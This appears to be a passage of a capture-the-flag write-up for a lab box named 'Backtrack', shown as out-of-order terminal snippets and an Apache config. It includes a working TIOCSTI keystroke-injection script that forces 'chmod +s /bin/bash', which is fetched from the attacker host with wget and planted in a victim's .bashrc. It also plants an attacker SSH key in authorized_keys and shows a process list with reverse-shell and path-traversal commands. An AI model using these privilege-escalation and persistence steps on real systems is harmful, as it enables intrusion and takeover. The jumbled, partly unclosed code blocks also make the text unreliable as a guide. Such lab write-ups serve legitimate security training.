   1262 /usr/sbin/apache2 -k start
   1263 /usr/sbin/apache2 -k start
   1264 /usr/sbin/apache2 -k start
   4200 /bin/sh
   4324 python3 -c import pty;pty.spawn("/bin/bash")
   4325 /bin/bash
   6767 sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../..
   6768 python3 /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/sh
   6770 /usr/sbin/uuidd --socket-activation
   6951 python3 /usr/bin/ansible-playbook /opt/test_playbooks/../../../../tmp/sh
   6963 /bin/sh -c /bin/sh -c '/usr/bin/python3 /tmp/ansible-tmp-1757637487.3240
   6964 /bin/sh -c /usr/bin/python3 /tmp/ansible-tmp-1757637487.3240623-26675989
   6965 /usr/bin/python3 /tmp/ansible-tmp-1757637487.3240623-266759896408792/Ans
   6967 /bin/sh -c /bin/sh </dev/tty >/dev/tty 2>/dev/tty
   6968 /bin/sh
   7172 python3 -c import pty;pty.spawn("/bin/bash")
   7173 /bin/bash
   8203 sshd: wilbur [priv]
   8325 /lib/systemd/systemd --user
   8326 (sd-pam)
   8401 sshd: wilbur@pts/3
   8402 -bash
   8569 /usr/sbin/apache2 -k start
  10628 /usr/libexec/fwupd/fwupd
  12565 sh -c uname -a; w; id; /bin/sh -i
  12570 /bin/sh -i
  12831 python3 -c import pty;pty.spawn("/bin/bash")
  12832 /bin/bash
  14978 /usr/sbin/apache2 -k start
  14979 /usr/sbin/apache2 -k start
  14989 /usr/sbin/apache2 -k start
  14990 /usr/sbin/apache2 -k start
  16235 [kworker/u30:3-events_power_efficient]
  16390 /usr/sbin/apache2 -k start
  16399 /usr/sbin/apache2 -k start
```


```bash
root@ip-10-201-18-53:~/Backtrack# cat script.py
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```


```bash
  orville@Backtrack:/tmp$ wget http://10.201.18.53:8000/script.py
--2025-09-12 02:33:30--  http://10.201.18.53:8000/script.py
Connecting to 10.201.18.53:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 193 [text/plain]
Saving to: \u2018script.py\u2019

script.py           100%[===================>]     193  --.-KB/s    in 0s      

2025-09-12 02:33:31 (14.0 MB/s) - \u2018script.py\u2019 saved [193/193]
```


```bash
orville@Backtrack:/tmp$ echo 'python3 /tmp/script.py' >> /home/orville/.bashrc
```


```bash
0rville@Backtrack:/home$ cd orville
orville@Backtrack:/home/orville$ ls
flag2.txt  web_snapshot.zip
orville@Backtrack:/home/orville$ ls -lah
total 68K
drwxrwx--- 4 orville orville 4.0K Sep 12 02:10 .
drwxr-xr-x 4 root    root    4.0K Mar  9  2024 ..
lrwxrwxrwx 1 root    root       9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 orville orville 3.8K Sep 12 02:34 .bashrc
drwx------ 2 orville orville 4.0K Sep 12 02:10 .cache
lrwxrwxrwx 1 root    root       9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 orville orville  807 Mar  9  2024 .profile
drwxr-xr-x 2 orville orville 4.0K Sep 12 02:07 .ssh
-rw------- 1 orville orville   38 Mar  9  2024 flag2.txt
-rwx------ 1 orville orville  37K Sep 12 01:27 web_snapshot.zip
orville@Backtrack:/home/orville$ echo 'python3 /tmp/script.py' >> .bashrc
orville@Backtrack:/home/orville$ ls -la
total 68
drwxrwx--- 4 orville orville  4096 Sep 12 02:10 .
drwxr-xr-x 4 root    root     4096 Mar  9  2024 ..
lrwxrwxrwx 1 root    root        9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 orville orville  3817 Sep 12 02:37 .bashrc
drwx------ 2 orville orville  4096 Sep 12 02:10 .cache
lrwxrwxrwx 1 root    root        9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 orville orville   807 Mar  9  2024 .profile
drwxr-xr-x 2 orville orville  4096 Sep 12 02:07 .ssh
-rw------- 1 orville orville    38 Mar  9  2024 flag2.txt
-rwx------ 1 orville orville 37572 Sep 12 01:27 web_snapshot.zip
```



```bash
orville@Backtrack:/home/orville$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```


```bash
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)


```bash
:~/Backtrack# ssh-keygen -f id_r
```

```bash
:~/Backtrack# cat id_r.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAUZR4uQ4Bqb2+13q9Lkeb96NX4b/SQVYQhn18sFP/AUr4Zy+xZbpOPYIncHBOEWF6Pscn3HBlZAnFvbI8h11T/MIjmofCmvQjbuI9y0ACPgPC6FAii9epcE91htwRVFMK5MC/yAg/N0FuL+pTmq6YiekCQDYT5jRXFf2ytJU4XzXx65RTTNRvzC4/SMm/mp1vj4ZV3arzFGwaqyPjdp47SnUBYVignT1o77uALE+jzzZhrlfmdOULoHrI8LUp09Ky2bCC69PIw1mgXHe/bg1LVZgUwcIjQl4zA2M0r6wmpU5vicpbdszPQTPt3sLvG2g5rOivlKOv2nIvcEqA/IYfwwKTjMCtO0D2Q4tsaMWqhG7sI0M8g6wPucIS3Ymbe5KODHZBgToe1nd+PYfq8rgFzp0uX2iTVMoGLaAAGkuMK9OLrSjVhZKer55NKMjUO3ihWKge0dYwf5taSNmhlph9bc1B2x6PbixkWh95WjLlbVqSUarqZS+uzCbiW4qrak8= root@ip-10-201-18-53
```


```bash
orville@Backtrack:/home/orville$ mkdir .ssh
```

```bash
orville@Backtrack:/home/orville$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAUZR4uQ4Bqb2+13q9Lkeb96NX4b/SQVYQhn18sFP/AUr4Zy+xZbpOPYIncHBOEWF6Pscn3HBlZAnFvbI8h11T/MIjmofCmvQjbuI9y0ACPgPC6FAii9epcE91htwRVFMK5MC/yAg/N0FuL+pTmq6YiekCQDYT5jRXFf2ytJU4XzXx65RTTNRvzC4/SMm/mp1vj4ZV3arzFGwaqyPjdp47SnUBYVignT1o77uALE+jzzZhrlfmdOULoHrI8LUp09Ky2bCC69PIw1mgXHe/bg1LVZgUwcIjQl4zA2M0r6wmpU5vicpbdszPQTPt3sLvG2g5rOivlKOv2nIvcEqA/IYfwwKTjMCtO0D2Q4tsaMWqhG7sI0M8g6wPucIS3Ymbe5KODHZBgToe1nd+PYfq8rgFzp0uX2iTVMoGLaAAGkuMK9OLrSjVhZKer55NKMjUO3ihWKge0dYwf5taSNmhlph9bc1B2x6PbixkWh95WjLlbVqSUarqZS+uzCbiW4qrak8= root@ip-10-201-18-53' > .ssh/authorized_keys
```




```bash
orville@Backtrack:/home/orville$ cd /tmp
orville@Backtrack:/tmp$ wget http://10.201.18.53:8000/pspy64
--2025-09-12 02:10:58--  http://10.201.18.53:8000/pspy64
Connecting to 10.201.18.53:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: \u2018pspy64\u2019

pspy64              100%[===================>]   2.94M  3.33MB/s    in 0.9s    

2025-09-12 02:10:59 (3.33 MB/s) - \u2018pspy64\u2019 saved [3078592/3078592]
```

```bash
orville@Backtrack:/tmp$ chmod +x pspy64
```

```bash
orville@Backtrack:/tmp$ 



```bash
orville@Backtrack:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...
```






```bash
orville@Backtrack:/etc/apache2$ cat apache2.conf
cat apache2.conf
...
#	/etc/apache2/
#	|-- apache2.conf
#	|	`--  ports.conf
#	|-- mods-enabled
#	|	|-- *.load
#	|	`-- *.conf
#	|-- conf-enabled
#	|	`-- *.conf
# 	`-- sites-enabled
#	 	`-- *.conf
...
#
# The directory where shm and other runtime files will be stored.
#

DefaultRuntimeDir ${APACHE_RUN_DIR}

#
# PidFile: The file in which the server should record its process
# identification number when it starts.
# This needs to be set in /etc/apache2/envvars
#
PidFile ${APACHE_PID_FILE}

#
# Timeout: The number of seconds before receives and sends time out.
#
Timeout 300

#
# KeepAlive: Whether or not to allow persistent connections (more than
# one request per connection). Set to "Off" to deactivate.
#
KeepAlive On

#
# MaxKeepAliveRequests: The maximum number of requests to allow
# during a persistent connection. Set to 0 to allow an unlimited amount.
# We recommend you leave this number high, for maximum performance.
#
MaxKeepAliveRequests 100

#
# KeepAliveTimeout: Number of seconds to wait for the next request from the
# same client on the same connection.
#
KeepAliveTimeout 5

# These need to be set in /etc/apache2/envvars
User orville
Group orville

#
# HostnameLookups: Log the names of clients or just their IP addresses
# e.g., www.apache.org (on) or 204.62.129.132 (off).
# The default is off because it'd be overall better for the net if people
# had to knowingly turn this feature on, since enabling it means that
# each client request will result in AT LEAST one lookup request to the
# nameserver.
#
HostnameLookups Off

# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog ${APACHE_LOG_DIR}/error.log

#
# LogLevel: Control the severity of messages logged to the error_log.
# Available values: trace8, ..., trace1, debug, info, notice, warn,
# error, crit, alert, emerg.
# It is also possible to configure the log level for particular modules, e.g.
# "LogLevel info ssl:warn"
#
LogLevel warn

# Include module configuration:
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# Include list of ports to listen on
Include ports.conf

# Sets the default security model of the Apache2 HTTPD server. It does
# not allow access to the root filesystem outside of /usr/share and /var/www.
# The former is used by web applications packaged in Debian,
# the latter may be used for local directories served by the web server. If
# your system is serving content from a sub-directory in /srv you must allow
# access here, or in any related virtual host.
<Directory />
	Options FollowSymLinks
	AllowOverride None
	Require all denied
</Directory>

<Directory /usr/share>
	AllowOverride None
	Require all granted
</Directory>

<Directory /var/www/>
	Options Indexes FollowSymLinks
	AllowOverride None
	Require all granted
</Directory>
<Directory /var/www/html/uploads>
        php_flag engine off
        AddType application/octet-stream php php3 php4 php5 phtml phps phar phpt
</Directory>
#<Directory /srv/>
#	Options Indexes FollowSymLinks
#	AllowOverride None
#	Require all granted
#</Directory>


# AccessFileName: The name of the file to look for in each directory
# for additional configuration directives.  See also the AllowOverride
# directive.
#
AccessFileName .htaccess_nonono_notthistime

#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
	Require all denied
</FilesMatch>

#
# The following directives define some format nicknames for use with
# a CustomLog directive.
#
# These deviate from the Common Log Format definitions in that they use %O
# (the actual bytes sent including headers) instead of %b (the size of the
# requested file), because the latter makes it impossible to detect partial
# requests.
#
# Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
# Use mod_remoteip instead.
#
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %>s %O" common
LogFormat "%{Referer}i -> %U" referer
LogFormat "%{User-agent}i" agent

# Include of directories ignores editors' and dpkg's backup files,
# see README.Debian for details.

# Include generic snippets of statements
IncludeOptional conf-enabled/*.conf

# Include the virtual host configurations:
IncludeOptional sites-enabled/*.conf

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```




